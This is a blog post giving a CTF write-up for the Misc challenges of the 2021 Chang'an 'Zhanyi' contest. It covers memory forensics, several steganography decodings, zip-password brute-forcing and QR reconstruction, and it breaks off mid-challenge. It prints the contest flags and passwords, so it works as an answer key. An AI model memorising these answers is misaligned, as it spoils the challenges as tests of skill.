<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/hudielan.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/fhudielan.png">
  <link rel="mask-icon" href="/images/hudielan.png" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>





<script>
    (function(){
        if(''){
            if (prompt('请输入密码') !== ''){
                alert('密码错误');
                history.back();
            }
        }
    })();
</script>
  <meta name="description" content="2021长安“战疫”网络安全卫士守护赛Wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2021长安“战疫”网络安全卫士守护赛Wp">
<meta property="og:url" content="http://example.com/2022/01/09/WriteUp/index.html">
<meta property="og:site_name" content="影影之家">
<meta property="og:description" content="2021长安“战疫”网络安全卫士守护赛Wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/70d9fdd94bb24a0b86a723c880d5fe27.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16">
<meta property="og:image" content="https://img-blog.csdnimg.cn/b6bc9593a9ca42f2a37a0d9efa4a45a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16">
<meta property="og:image" content="https://img-blog.csdnimg.cn/d7890c2bd0c246c0b9b28b41958b51e8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e73eff4d3bef4ba0ae7cb1e9ff699660.png">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXnpQQdUTDIq0xSYYXx7ax2QRbiavPKbiaGucxucClwvV6kvZDn2qrmskA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXYVeLvibqqTWcZSQNBTjogHgz1gup7Q5AaIxCCiajfGsjNWFeLctPibib7Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXN3OARkkVlNjZoHg3zIerCo2LVxia1ALiaibadYtOzLTOtWnv9jhUvSlTA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXVqs5y6IeNu9LDicnGY9l0mBic1cz4CjBFGd2iblwzibKqUaP0R4yfojwnw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXd16cF24o4icJO4lrvhAUgX06b1UYOvnkCXgNhlpeia7xWhqRSbfiakj5A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXZibT4BwLfvsiaYjCZolD5eLGc6yTorKXxFM9LoX2ExPBIPiaXdrwia9ic4A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXjISAwy6HMYZKeqRYHojbgWpWXejgicElvAnHxJEby1pgI3Aoldgb14Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXMlakDN79umD8qCyorGlP2998FniaMeLZsMKOicXzMNK1RmRn92Gic8tQA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXRnJrVMfzRZHEsicmpD6JNC9VeacIXPUA06fIStOTUx3GyLRPKuloaew/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXFdwu26MriaqSfhbWYrFeGrRxxs2eYK1f2ib2HR0a1IWKYgmia1JT5p0Zw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXhIOvfo8uJeQRiaBwvO4cSJYztguURNoMpaMUiaVJqKHqaL76gHbRz0Yg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXRZuFb9iaTY3ztXJUw21ghRcQWlV0Uj5JIvN0hDo7SpGsRdPDebPEkbA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXRqIEKDjq8c0PPXa6e1PQTtRj2JZ5dXpswUJ0GPKgMIAK0gTOVQmtaQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXHQMibSJCHXNgJIWnO7rtffTq10JwwEGibBia0zUVn1Cha6ZzBIHpHCvJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXibOqs2ZkesvnP22yWZh6S7swJnMXyNpYcicogBASlGOwAZ5pNNffhfwA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXMq7trmXuPPzXhQVfbV6I0zSu3PGtWCUjGM4sAhaLf9ibibNzMUpMqKSQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXB6kAGmibvDyvMkgAMgbACyptIUHHGukiagmzFeABOlOGgOjFRtVHQmsQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXfKF9CVxH8FHfu6icPTWXUy8nf0otKCrJAaGoCyEgJic7hFVjgnlMhsvg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="http://example.com/2022/01/09/WriteUp/1.png">
<meta property="og:image" content="http://example.com/2022/01/09/WriteUp/2.png">
<meta property="og:image" content="http://example.com/2022/01/09/WriteUp/3.png">
<meta property="og:image" content="http://example.com/2022/01/09/WriteUp/4.png">
<meta property="og:image" content="http://example.com/2022/01/09/WriteUp/5.png">
<meta property="og:image" content="http://example.com/2022/01/09/WriteUp/6.png">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuX1HkPmI2zU03w3zKcBA57cc7f5pBetskxZrXIMmEBSWhicrXIeibADibJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXErQ0o06QaX7jBDouicgBdFFcHfyHiasJiaB48VZwJem1dO3xkbgfGsJ9A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXoKEiclPz0dSCoNZDDAxic6j1X2P2ELrRnCpBmDQDbh1bdiaXTicwSrCLPA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuX8XKaYbaeqFcVcicOmwPibt3BWAtutVOQGLdDdbF5zzjJT82kdxNa1lrQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXPJI3FtI4pYm79hU6bDODs8b5GWjCWHtUUnkrVQxicwnrlJfFMxXmIBQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXqUVCzrzORedxZSc8q430ibtFGTLbtzUicFF3krLefNxiatOzm0sv6y8qg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXgzcHS41xmZaSiahNqF8siakyiaqVYuQwOYlkuzicuGzvg5cyMJS5Rubiazg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXkjMubxmZ3VxENIJdqIGPY68CFQok4OdQy1W8q9Yph9gwmEssjkAUvw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXIayuycOOia65healhTqkm9aQLpzGwJib4XuzMvicSibibabKm3SFibahq13g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXTTUFE3Jy44ibBoTSzccwib4na7P4qwpcib0PaHISAo3ruVDGbnBM45Wzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="article:published_time" content="2022-01-09T08:17:24.000Z">
<meta property="article:modified_time" content="2022-07-08T08:35:50.265Z">
<meta property="article:author" content="余归">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/70d9fdd94bb24a0b86a723c880d5fe27.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16">

<link rel="canonical" href="http://example.com/2022/01/09/WriteUp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>2021长安“战疫”网络安全卫士守护赛Wp | 影影之家</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">影影之家</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
        <li class="menu-item menu-item-love">

    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/WriteUp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="余归">
      <meta itemprop="description" content="Believe not all that you see nor half what you hear.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="影影之家">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2021长安“战疫”网络安全卫士守护赛Wp
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-09 16:17:24" itemprop="dateCreated datePublished" datetime="2022-01-09T16:17:24+08:00">2022-01-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-08 16:35:50" itemprop="dateModified" datetime="2022-07-08T16:35:50+08:00">2022-07-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span id="/2022/01/09/WriteUp/" class="post-meta-item leancloud_visitors" data-flag-title="2021长安“战疫”网络安全卫士守护赛Wp" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2022/01/09/WriteUp/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2022/01/09/WriteUp/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>2021长安“战疫”网络安全卫士守护赛Wp</p>
<span id="more"></span>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="【八卦迷宫】"><a href="#【八卦迷宫】" class="headerlink" title="【八卦迷宫】"></a>【八卦迷宫】</h3><p>按照迷宫走然后取拼音即可</p>
<p>flag如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【朴实无华的取证】"><a href="#【朴实无华的取证】" class="headerlink" title="【朴实无华的取证】"></a>【朴实无华的取证】</h3><p>首先查看版本 imageinfo得到WinXPSP2x86</p>
<p>然后pslist，注意<img src="https://img-blog.csdnimg.cn/70d9fdd94bb24a0b86a723c880d5fe27.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16" alt=" "></p>
<p>然后<img src="https://img-blog.csdnimg.cn/b6bc9593a9ca42f2a37a0d9efa4a45a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16" alt=" "></p>
<p>发现目录是桌面而并非Desktop，重新filescan一下，导出有用信息<img src="https://img-blog.csdnimg.cn/d7890c2bd0c246c0b9b28b41958b51e8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16" alt=" "></p>
<p>首先zip的密码是上面说的20211209</p>
<p>其次，得到的txt是加密函数，而密文在flag.png上。反过来写一个脚本</p>
<p>于是有了这个脚本:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = &#x27;fdcb[8ldq?zloo?fhuwdlqob?vxffhhg?lq?iljkwlqj?wkh?hslghplf]&#x27;</span><br><span class="line">for i in s:</span><br><span class="line">    if(ord(i)&gt;=ord(&#x27;a&#x27;) and ord(i)&lt;=ord(&#x27;w&#x27;)):</span><br><span class="line">        print(chr(ord(i)-3),end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;a&#x27;):</span><br><span class="line">        print(&#x27;x&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;b&#x27;):</span><br><span class="line">        print(&#x27;y&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;c&#x27;):</span><br><span class="line">        print(&#x27;z&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &quot;|&quot;):</span><br><span class="line">        print(&#x27;_&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(chr(ord(i)+32),end=&#x27;&#x27;)</span><br><span class="line"> #ca`_&#123;Xian_šill_certainl__s˜cceed_in_fighting_the_epidemic&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查了一下certainl后面应该还有个y</p>
<p>然后前面那个单词是will，后面那个单词是succeed，于是得到flag提交正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【无字天书】"><a href="#【无字天书】" class="headerlink" title="【无字天书】"></a>【无字天书】</h3><p>导出HTTP流，在导出的其中两个文件发现hex串，都是很明显的zip，hex–&gt;ascii，得到zip，打开zip得到两文件，一个key.ws一个flag.txt</p>
<p>ws很明显的whitespace，直接<a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/%E5%BE%97%E5%88%B0key:XiAnWillBeSafe">https://vii5ard.github.io/whitespace/得到key:XiAnWillBeSafe</a></p>
<p>然后flag.txt很明显的SNOW</p>
<p>.\SNOW.EXE -p XiAnWillBeSafe -C .\flag.txt<img src="https://img-blog.csdnimg.cn/e73eff4d3bef4ba0ae7cb1e9ff699660.png" alt=" "></p>
<h3 id="【西安加油】"><a href="#【西安加油】" class="headerlink" title="【西安加油】"></a>【西安加油】</h3><p>查看流量包发现大量的base64串，导出http发现secret.txt，base64解码发现是zip，保存后打开发现是拼图</p>
<p>因为不知道大小，所以猜了一个12*4</p>
<p>命令montage *png -tile 12x4 -geometry 100x100+0+0 out2.png</p>
<p>然后用gaps</p>
<p>python3 gaps –image=out2.png –generations=10 –population=48 –size=100 –save</p>
<h3 id="【ez-Encrypt】"><a href="#【ez-Encrypt】" class="headerlink" title="【ez_Encrypt】"></a>【ez_Encrypt】</h3><p>压缩包存在密码，查看注释可以得知密码为6位数字</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXnpQQdUTDIq0xSYYXx7ax2QRbiavPKbiaGucxucClwvV6kvZDn2qrmskA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>找到工具爆破一下压缩包得到密码为<code>220101</code></p>
<p>解压后首先看到<code>steg.pyc</code>，可以想到Pyc字节码隐写，找到<code>https://github.com/AngelKitty/stegosaurus</code>后对pyc文件的隐藏文本进行提取：</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXYVeLvibqqTWcZSQNBTjogHgz1gup7Q5AaIxCCiajfGsjNWFeLctPibib7Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>得到：<code>TheKey:St3g1sV3ryFuNny</code></p>
<p>然后再去<code>https://aghorler.github.io/emoji-aes/</code> 对<code>Emjio.txt</code>中的表情进行AES解码，密钥为<code>St3g1sV3ryFuNny</code>，得到flag：</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXN3OARkkVlNjZoHg3zIerCo2LVxia1ALiaibadYtOzLTOtWnv9jhUvSlTA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<h3 id="【binary】"><a href="#【binary】" class="headerlink" title="【binary】"></a>【binary】</h3><p>不知道是什么文件，用file识别知道是java程序</p>
<p>file 234        <img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXVqs5y6IeNu9LDicnGY9l0mBic1cz4CjBFGd2iblwzibKqUaP0R4yfojwnw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>无法反编译，cat发现class名字是<code>Main.class</code>，所以把文件名改成<code>Main.class</code></p>
<p>用jdgui反编译</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXd16cF24o4icJO4lrvhAUgX06b1UYOvnkCXgNhlpeia7xWhqRSbfiakj5A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>可以看到一个数组，提取出来，转换成ascii得到</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXZibT4BwLfvsiaYjCZolD5eLGc6yTorKXxFM9LoX2ExPBIPiaXdrwia9ic4A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>可以看到是base64，解密得到</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXjISAwy6HMYZKeqRYHojbgWpWXejgicElvAnHxJEby1pgI3Aoldgb14Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>可以看到10之间夹杂着很多\n，于是打印出来复制到sublime，看起来是一个正方形，猜测是二维码，写脚本生成二维码</p>
<p>Python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import cv2</span><br><span class="line">a=&quot;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&quot;</span><br><span class="line">cv2.imwrite(&quot;1.png&quot;,np.array([i for i in a]).astype(int).reshape(37,37)*255)</span><br></pre></td></tr></table></figure>

<p>识别二维码</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXMlakDN79umD8qCyorGlP2998FniaMeLZsMKOicXzMNK1RmRn92Gic8tQA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<h3 id="【pipicc】"><a href="#【pipicc】" class="headerlink" title="【pipicc】"></a>【pipicc】</h3><p>可以看到 327006.bmp 中有一片噪点，猜测是对像素点有所修改，用 010editor 打开，可以在 BITMAPLINE 结构中看到 IHDR 头，看不见 png 头，手动补上.</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXRnJrVMfzRZHEsicmpD6JNC9VeacIXPUA06fIStOTUx3GyLRPKuloaew/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>补上以后</p>
